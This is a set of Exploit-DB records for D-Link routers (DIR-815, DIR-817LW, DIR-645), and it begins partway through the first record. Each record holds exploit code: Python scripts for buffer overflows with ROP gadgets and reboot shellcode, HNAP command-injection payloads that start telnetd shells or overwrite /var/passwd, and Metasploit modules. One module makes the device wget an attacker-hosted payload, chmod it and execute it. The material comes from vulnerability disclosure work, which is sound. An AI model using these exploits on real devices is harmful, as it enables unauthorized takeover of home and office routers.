XSRF if not exposed.\r\n\r\n## Details\r\n\r\nBuffer overflow in auth \r\n----------------------------------------------------------------------------------------------------------------------\r\nimport urllib\r\nimport urllib2\r\n\r\n# This exploits the auth_main.cgi with read buffer overflow exploit for v2.02\r\n# prequisite is just to have id and password fields in params\r\n\r\nurl = \'http://192.168.0.1/authentication.cgi\'\r\njunk = "A"*1004+"B"*37+"\\x58\\xf8\\x40\\x00" # address of system function in executable\r\njunk+="X"*164+\'echo  "Admin" "Admin" "0" > /var/passwd\\x00\'+"AAAA"\r\nvalues = "id=test&password=test&test="+junk\r\n\r\n\r\nreq = urllib2.Request(url, values)\r\nresponse = urllib2.urlopen(req)\r\nthe_page = response.read()\r\n\r\n----------------------------------------------------------------------------------------------------------------------\r\n\r\nBuffer overflow in HNAP\r\n----------------------------------------------------------------------------------------------------------------------\r\nimport socket\r\nimport struct\r\n\r\n\r\n# format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address)\r\n\r\nbuf = "POST /HNAP1/ HTTP/1.0\\r\\nHOST: 192.168.1.8\\r\\nUser-Agent: test\\r\\nContent-Length: 1\\r\\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + ";sh;"+"H"*286 \r\nbuf+= "\\x40\\xF4\\xB1\\x2A" # (ROP gadget which puts right value in A0)\r\nbuf+= "B"*20+"ZZZZ"+"telnetd -p 6778"+"C"*5 # adjustment to get to the right payload\r\nbuf+="\\xA0\\xb2\\xb4\\x2a" # The system address is 2Ab4b200 so changing that in GDB just before jumping to test if it works which it does not\r\nbuf+= "\\r\\n" + "1\\r\\n\\r\\n"\r\n \r\nprint "[+] sending buffer size", len(buf)\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(("1.2.3.4", 80))\r\ns.send(buf)\r\n\r\n\r\n----------------------------------------------------------------------------------------------------------------------\r\n\r\nCommand injection in \r\n----------------------------------------------------------------------------------------------------------------------\r\nimport socket\r\nimport struct\r\n\r\n# CSRF or any other trickery, but probably only works when connected to network I suppose \r\n\r\nbuf = "POST /HNAP1/ HTTP/1.0\\r\\nHOST: 99.249.143.124\\r\\nUser-Agent: test\\r\\nContent-Length: 1\\r\\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + \';telnetd -p 9090;\\r\\n\' + "1\\r\\n\\r\\n"\r\n \r\nprint "[+] sending buffer size", len(buf)\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(("192.168.0.1", 80))\r\ns.send(buf)\r\n\r\n----------------------------------------------------------------------------------------------------------------------\r\n\r\n## Report Timeline\r\n\r\n* April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline.\r\n* July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor\r\n* Nov 13, 2015: A public advisory is sent to security mailing lists.\r\n\r\n## Credit\r\n\r\nThis vulnerability was found by Samuel Huntley', 'description': 'D-Link DIR-815 - Multiple Vulnerabilities', 'author': 'Samuel Huntley', '_id': 38721, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2015-11-16T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 80}
{'code': '##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n  Rank = NormalRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n  include Msf::Exploit::CmdStager\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\'        => \'D-Link Devices HNAP SOAPAction-Header Command Execution\',\r\n      \'Description\' => %q{\r\n        Different D-Link Routers are vulnerable to OS command injection in the HNAP SOAP\r\n        interface. Since it is a blind OS command injection vulnerability, there is no\r\n        output for the executed command. This module has been tested on a DIR-645 device.\r\n        The following devices are also reported as affected: DAP-1522 revB, DAP-1650 revB,\r\n        DIR-880L, DIR-865L, DIR-860L revA, DIR-860L revB DIR-815 revB, DIR-300 revB,\r\n        DIR-600 revB, DIR-645, TEW-751DR, TEW-733GR\r\n      },\r\n      \'Author\'      =>\r\n        [\r\n          \'Samuel Huntley\', # first public documentation of this Vulnerability on DIR-645\r\n          \'Craig Heffner\',  # independent Vulnerability discovery on different other routers\r\n          \'Michael Messner <devnull[at]s3cur1ty.de>\' # Metasploit module\r\n        ],\r\n      \'License\'     => MSF_LICENSE,\r\n      \'References\'  =>\r\n        [\r\n          [\'URL\', \'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10051\'],\r\n          [\'URL\', \'http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/\']\r\n        ],\r\n      \'DisclosureDate\' => \'Feb 13 2015\',\r\n      \'Privileged\'     => true,\r\n      \'Platform\'       => \'linux\',\r\n      \'Targets\' =>\r\n        [\r\n          [ \'MIPS Little Endian\',\r\n            {\r\n              \'Arch\'     => ARCH_MIPSLE\r\n            }\r\n          ],\r\n          [ \'MIPS Big Endian\',  # unknown if there are BE devices out there ... but in case we have a target\r\n            {\r\n              \'Arch\'     => ARCH_MIPSBE\r\n            }\r\n          ]\r\n        ],\r\n      \'DefaultTarget\'    => 0\r\n      ))\r\n\r\n      deregister_options(\'CMDSTAGER::DECODER\', \'CMDSTAGER::FLAVOUR\')\r\n  end\r\n\r\n  def check\r\n    uri = \'/HNAP1/\'\r\n    soap_action = \'http://purenetworks.com/HNAP1/GetDeviceSettings\'\r\n\r\n    begin\r\n      res = send_request_cgi({\r\n        \'uri\'    => uri,\r\n        \'method\' => \'GET\',\r\n        \'headers\' => {\r\n          \'SOAPAction\' => soap_action,\r\n          }\r\n      })\r\n\r\n      if res && [200].include?(res.code) && res.body =~ /D-Link/\r\n        return Exploit::CheckCode::Detected\r\n      end\r\n    rescue ::Rex::ConnectionError\r\n      return Exploit::CheckCode::Unknown\r\n    end\r\n\r\n    Exploit::CheckCode::Unknown\r\n  end\r\n\r\n  def exploit\r\n    print_status("#{peer} - Trying to access the device ...")\r\n\r\n    unless check == Exploit::CheckCode::Detected\r\n      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable device")\r\n    end\r\n\r\n    print_status("#{peer} - Exploiting...")\r\n\r\n    execute_cmdstager(\r\n      :flavour  => :echo,\r\n      :linemax => 200,\r\n      :temp    => \'\'\r\n    )\r\n  end\r\n\r\n  def execute_command(cmd, opts)\r\n\r\n    uri = \'/HNAP1/\'\r\n\r\n    # we can not use / in our command so we need to use a little trick\r\n    cmd_new = \'cd && cd tmp && export PATH=$PATH:. && \' << cmd\r\n    soap_action = "http://purenetworks.com/HNAP1/GetDeviceSettings/`#{cmd_new}`"\r\n\r\n    begin\r\n      res = send_request_cgi({\r\n        \'uri\'    => uri,\r\n        \'method\' => \'GET\',\r\n        \'headers\' => {\r\n          \'SOAPAction\' => soap_action,\r\n          }\r\n      }, 3)\r\n    rescue ::Rex::ConnectionError\r\n      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")\r\n    end\r\n  end\r\nend', 'description': 'D-Link Devices - HNAP SOAPAction-Header Command Execution (Metasploit)', 'author': 'Metasploit', '_id': 37171, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2015-06-01T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n  include Msf::Exploit::Remote::HttpServer\r\n  include Msf::Exploit::EXE\r\n  include Msf::Exploit::FileDropper\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\'        => \'DLink DIR-645 / DIR-815 diagnostic.php Command Execution\',\r\n      \'Description\' => %q{\r\n          Some DLink Routers are vulnerable to OS Command injection in the web interface.\r\n        On DIR-645 versions prior 1.03 authentication isn\'t needed to exploit it. On\r\n        version 1.03 authentication is needed in order to trigger the vulnerability, which\r\n        has been fixed definitely on version 1.04. Other DLink products, like DIR-300 rev B\r\n        and DIR-600, are also affected by this vulnerability. Not every device includes\r\n        wget which we need for deploying our payload. On such devices you could use the cmd\r\n        generic payload and try to start telnetd or execute other commands. Since it is a\r\n        blind os command injection vulnerability, there is no output for the executed\r\n        command when using the cmd generic payload. A ping command against a controlled\r\n        system could be used for testing purposes. This module has been tested successfully\r\n        on DIR-645 prior to 1.03, where authentication isn\'t needed in order to exploit the\r\n        vulnerability.\r\n      },\r\n      \'Author\'      =>\r\n        [\r\n          \'Michael Messner <devnull@s3cur1ty.de>\', # Vulnerability discovery and Metasploit module\r\n          \'juan vazquez\' # minor help with msf module\r\n        ],\r\n      \'License\'     => MSF_LICENSE,\r\n      \'References\'  =>\r\n        [\r\n          [ \'OSVDB\', \'92144\' ],\r\n          [ \'BID\', \'58938\' ],\r\n          [ \'EDB\', \'24926\' ],\r\n          [ \'URL\', \'http://www.s3cur1ty.de/m1adv2013-017\' ]\r\n        ],\r\n      \'DisclosureDate\' => \'Mar 05 2013\',\r\n      \'Privileged\'     => true,\r\n      \'Platform\'       => [\'linux\',\'unix\'],\r\n      \'Payload\'        =>\r\n        {\r\n          \'DisableNops\' => true\r\n        },\r\n      \'Targets\'        =>\r\n        [\r\n          [ \'CMD\',\r\n            {\r\n            \'Arch\' => ARCH_CMD,\r\n            \'Platform\' => \'unix\'\r\n            }\r\n          ],\r\n          [ \'Linux mipsel Payload\',\r\n            {\r\n            \'Arch\' => ARCH_MIPSLE,\r\n            \'Platform\' => \'linux\'\r\n            }\r\n          ],\r\n        ],\r\n      \'DefaultTarget\'  => 1\r\n      ))\r\n\r\n    register_options(\r\n      [\r\n        OptAddress.new(\'DOWNHOST\', [ false, \'An alternative host to request the MIPS payload from\' ]),\r\n        OptString.new(\'DOWNFILE\', [ false, \'Filename to download, (default: random)\' ]),\r\n        OptInt.new(\'HTTP_DELAY\', [true, \'Time that the HTTP Server will wait for the ELF payload request\', 60])\r\n      ], self.class)\r\n  end\r\n\r\n\r\n  def request(cmd,uri)\r\n    begin\r\n      res = send_request_cgi({\r\n        \'uri\'    => uri,\r\n        \'method\' => \'POST\',\r\n        \'vars_post\' => {\r\n          "act" => "ping",\r\n          "dst" => "` #{cmd}`"        }\r\n      })\r\n      return res\r\n    rescue ::Rex::ConnectionError\r\n      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")\r\n      return nil\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    downfile = datastore[\'DOWNFILE\'] || rand_text_alpha(8+rand(8))\r\n    uri = \'/diagnostic.php\'\r\n\r\n    if target.name =~ /CMD/\r\n      if not (datastore[\'CMD\'])\r\n        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")\r\n      end\r\n      cmd = payload.encoded\r\n      res = request(cmd,uri)\r\n      if (!res)\r\n        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")\r\n      end\r\n      print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")\r\n      return\r\n    end\r\n\r\n    #thx to Juan for his awesome work on the mipsel elf support\r\n    @pl = generate_payload_exe\r\n    @elf_sent = false\r\n\r\n    #\r\n    # start our server\r\n    #\r\n    resource_uri = \'/\' + downfile\r\n\r\n    if (datastore[\'DOWNHOST\'])\r\n      service_url = \'http://\' + datastore[\'DOWNHOST\'] + \':\' + datastore[\'SRVPORT\'].to_s + resource_uri\r\n    else\r\n      #do not use SSL\r\n      if datastore[\'SSL\']\r\n        ssl_restore = true\r\n        datastore[\'SSL\'] = false\r\n      end\r\n\r\n      #we use SRVHOST as download IP for the coming wget command.\r\n      #SRVHOST needs a real IP address of our download host\r\n      if (datastore[\'SRVHOST\'] == "0.0.0.0" or datastore[\'SRVHOST\'] == "::")\r\n        srv_host = Rex::Socket.source_address(rhost)\r\n      else\r\n        srv_host = datastore[\'SRVHOST\']\r\n      end\r\n\r\n      service_url = \'http://\' + srv_host + \':\' + datastore[\'SRVPORT\'].to_s + resource_uri\r\n\r\n      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")\r\n      start_service({\'Uri\' => {\r\n        \'Proc\' => Proc.new { |cli, req|\r\n          on_request_uri(cli, req)\r\n        },\r\n        \'Path\' => resource_uri\r\n      }})\r\n\r\n      datastore[\'SSL\'] = true if ssl_restore\r\n    end\r\n\r\n    #\r\n    # download payload\r\n    #\r\n    print_status("#{rhost}:#{rport} - Asking the DLink device to download #{service_url}")\r\n    #this filename is used to store the payload on the device\r\n    filename = rand_text_alpha_lower(8)\r\n\r\n    #not working if we send all command together -> lets take three requests\r\n    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename}"\r\n    res = request(cmd,uri)\r\n    if (!res)\r\n      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")\r\n    end\r\n\r\n    # wait for payload download\r\n    if (datastore[\'DOWNHOST\'])\r\n      print_status("#{rhost}:#{rport} - Giving #{datastore[\'HTTP_DELAY\']} seconds to the Dlink device to download the payload")\r\n      select(nil, nil, nil, datastore[\'HTTP_DELAY\'])\r\n    else\r\n      wait_linux_payload\r\n    end\r\n    register_file_for_cleanup("/tmp/#{filename}")\r\n\r\n    #\r\n    # chmod\r\n    #\r\n    cmd = "chmod 777 /tmp/#{filename}"\r\n    print_status("#{rhost}:#{rport} - Asking the Dlink device to chmod #{downfile}")\r\n    res = request(cmd,uri)\r\n    if (!res)\r\n      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")\r\n    end\r\n\r\n    #\r\n    # execute\r\n    #\r\n    cmd = "/tmp/#{filename}"\r\n    print_status("#{rhost}:#{rport} - Asking the Dlink device to execute #{downfile}")\r\n    res = request(cmd,uri)\r\n    if (!res)\r\n      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")\r\n    end\r\n\r\n  end\r\n\r\n  # Handle incoming requests from the server\r\n  def on_request_uri(cli, request)\r\n    #print_status("on_request_uri called: #{request.inspect}")\r\n    if (not @pl)\r\n      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn\'t ready yet!")\r\n      return\r\n    end\r\n    print_status("#{rhost}:#{rport} - Sending the payload to the server...")\r\n    @elf_sent = true\r\n    send_response(cli, @pl)\r\n  end\r\n\r\n  # wait for the data to be sent\r\n  def wait_linux_payload\r\n    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")\r\n\r\n    waited = 0\r\n    while (not @elf_sent)\r\n      select(nil, nil, nil, 1)\r\n      waited += 1\r\n      if (waited > datastore[\'HTTP_DELAY\'])\r\n        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn\'t request request the ELF payload -- Maybe it cant connect back to us?")\r\n      end\r\n    end\r\n  end\r\n\r\nend', 'description': "D-Link DIR-645 / DIR-815 - 'diagnostic.php' Command Execution (Metasploit)", 'author': 'Metasploit', '_id': 24956, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2013-04-12T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '## Advisory Information\r\n\r\nTitle: DIR-817LW Buffer overflows and Command injection in authentication and HNAP functionalities\r\nVendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink)\r\nCVE: None\r\n\r\nNote: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, \r\nhttp://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061\r\n\r\nHowever, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares.The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.  \r\n\r\n## Product Description\r\n\r\nDIR-817LW -- Wireless AC750 Dual Band Cloud Router. Mainly used by home and small offices.\r\n\r\n## Vulnerabilities Summary\r\n\r\nHave come across 3 security issues in DIR-815 firmware which allows an attacker to exploit command injection and buffer overflows in authentication adn HNAP functionality. All of them can be exploited by an unauthentictaed attacker. The attacker can be on wireless LAN or WAN if mgmt interface is exposed to attack directly or using XSRF if not exposed.\r\n\r\n## Details\r\n\r\nBuffer overflow in auth \r\n----------------------------------------------------------------------------------------------------------------------\r\nimport socket\r\nimport struct\r\n\r\n#Reboot shellcode in there\r\n\r\n\r\nbuf = "GET /dws/api/Login?id="\r\nbuf+="A"*2064+"AAAA" #s0 # uclibc system address\r\nbuf+="\\x2A\\xAF\\xD0\\x84" #s1 -- points to iret\r\nbuf+="\\x2A\\xB1\\x4D\\xF0" #s2 -- points to sleep\r\nbuf+="\\x2A\\xB1\\x4D\\xF0"\r\nbuf+="\\x2A\\xB1\\x4D\\xF0"\r\nbuf+="\\x2A\\xB1\\x4D\\xF0"\r\nbuf+="\\x2A\\xB0\\xDE\\x54" # s6 filled up with pointer to rop4 which is ultimate mission\r\nbuf+="\\x2A\\xB1\\x4D\\xF0"\r\nbuf+="\\x2A\\xAC\\xAD\\x70" # Retn address  ROP gadget 1 that loads into $a0\r\nbuf+="C"*36 # \r\nbuf+="\\x2A\\xAC\\xD5\\xB4" # points to rop3 \r\n#buf+="1"*17 # exit payload\r\nbuf+="E"*16\r\nbuf+="\\x3c\\x06\\x43\\x21\\x34\\xc6\\xfe\\xdc\\x3c\\x05\\x28\\x12\\x34\\xa5\\x19\\x69\\x3c\\x04\\xfe\\xe1\\x34\\x84\\xde\\xad\\x24\\x02\\x0f\\xf8\\x01\\x01\\x01\\x0c" #reboot big endian \r\nbuf+="Y"*120 # ROP gadget 2 that loads into $t9\r\nbuf+="&password=A HTTP/1.1\\r\\nHOST: 192.168.1.8\\r\\nUser-Agent: test\\r\\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nConnection:keep-alive\\r\\nContent-Length:5000\\r\\n\\r\\nid="+"A"*5000+"\\r\\n\\r\\n"\r\n \r\nprint "[+] sending buffer size", len(buf)\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(("192.168.1.8", 80))\r\ns.send(buf)\r\n\r\n----------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\nBuffer overflow in HNAP\r\n----------------------------------------------------------------------------------------------------------------------\r\nimport socket\r\nimport struct\r\n\r\n# Working\r\n\r\nbuf = "POST /HNAP1/ HTTP/1.0\\r\\nHOST: 192.168.1.8\\r\\nUser-Agent: test\\r\\nContent-Length: 1\\r\\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + ";sh;"+"B"*158\r\nbuf+="\\x2A\\xAF\\xD0\\x84" #s1 -- points to iret\r\nbuf+="\\x2A\\xB1\\x4D\\xF0" #s2 -- points to sleep\r\nbuf+="AAAA"+"AAAA"+"AAAA" #s3,s4,s5\r\nbuf+="\\x2A\\xB0\\xDE\\x54" # s6 filled up with pointer to rop4 which is ultimate mission\r\nbuf+="AAAA"\r\nbuf+="\\x2A\\xAC\\xAD\\x70" # Retn address  ROP gadget 1 that loads into $a0\r\nbuf+="C"*36\r\nbuf+="\\x2A\\xAC\\xD5\\xB4" # points to rop3 \r\nbuf+="C"*16\r\nbuf+="\\x3c\\x06\\x43\\x21\\x34\\xc6\\xfe\\xdc\\x3c\\x05\\x28\\x12\\x34\\xa5\\x19\\x69\\x3c\\x04\\xfe\\xe1\\x34\\x84\\xde\\xad\\x24\\x02\\x0f\\xf8\\x01\\x01\\x01\\x0c" #reboot big endian shell\r\nbuf+="B"*28+"\\r\\n" + "1\\r\\n\\r\\n"\r\n \r\nprint "[+] sending buffer size", len(buf)\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(("192.168.1.8", 80))\r\ns.send(buf)\r\n----------------------------------------------------------------------------------------------------------------------\r\n\r\nCommand injection \r\n----------------------------------------------------------------------------------------------------------------------\r\nimport socket\r\nimport struct\r\n\r\n# CSRF or any other trickery, but probably only works when connected to network I suppose and internal\r\n\r\nbuf = "POST /HNAP1/ HTTP/1.0\\r\\nHOST: 192.168.1.8\\r\\nUser-Agent: test\\r\\nContent-Length: 1\\r\\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + \';echo "<?phpinfo?>" > passwd1.php;telnetd -p 9090;test\\r\\n\' + "1\\r\\n\\r\\n"\r\n \r\nprint "[+] sending buffer size", len(buf)\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(("1.2.3.4", 80))\r\ns.send(buf)\r\n\r\n----------------------------------------------------------------------------------------------------------------------\r\n\r\n## Report Timeline\r\n\r\n* April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline.\r\n* July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor\r\n* Nov 13, 2015: A public advisory is sent to security mailing lists.\r\n\r\n## Credit\r\n\r\nThis vulnerability was found by Samuel Huntley', 'description': 'D-Link DIR-817LW - Multiple Vulnerabilities', 'author': 'Samuel Huntley', '_id': 38720, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2015-11-16T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 80}
